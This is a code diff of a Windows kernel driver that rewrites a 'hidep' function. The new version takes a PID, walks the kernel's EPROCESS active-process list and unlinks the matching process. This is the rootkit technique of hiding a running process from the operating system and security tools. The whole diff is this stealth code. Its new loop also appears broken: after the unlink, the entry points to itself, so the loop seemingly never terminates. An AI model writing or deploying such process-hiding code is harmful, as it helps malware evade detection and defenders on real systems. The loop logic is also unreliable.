@@ -1,6 +1,6 @@
 #include "Driver.h"
 
-NTSTATUS hidep() {
+NTSTATUS hidep(UINT32 pid) {
 
 	ULONG PID_OFFSET = find_eproc_pid();
 
@@ -10,20 +10,41 @@ NTSTATUS hidep() {
 
 	PEPROCESS currentProcess = PsGetCurrentProcess();
 
-	PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
+	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
+	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
 
-	PLIST_ENTRY prev;
-	PLIST_ENTRY next;
+	// Record the starting position
+	PEPROCESS StartProcess = currentProcess;
 
-	prev = current->Blink;
-	next = current->Flink;
+	// Move to next item
+	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
+	CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
+	currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 
-	prev->Flink = next;
-	next->Blink = prev;
+	// Loop until we find the right process to remove
+	// Or until we circle back
+	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {
 
-	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
-	current->Blink = (PLIST_ENTRY)&current->Flink;
-	current->Flink = (PLIST_ENTRY)&current->Flink;
+		// Check item
+		if (*(UINT32*)CurrentPID == pid) {
+		
+			PLIST_ENTRY prev = currentList->Blink;
+			PLIST_ENTRY next = currentList->Flink;
+
+			prev->Flink = next;
+			next->Blink = prev;
+
+			// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
+			currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
+			currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
+
+		}
+
+		// Move to next item
+		currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
+		CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
+		currentList = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
+	}
 
 	return STATUS_SUCCESS;
 }
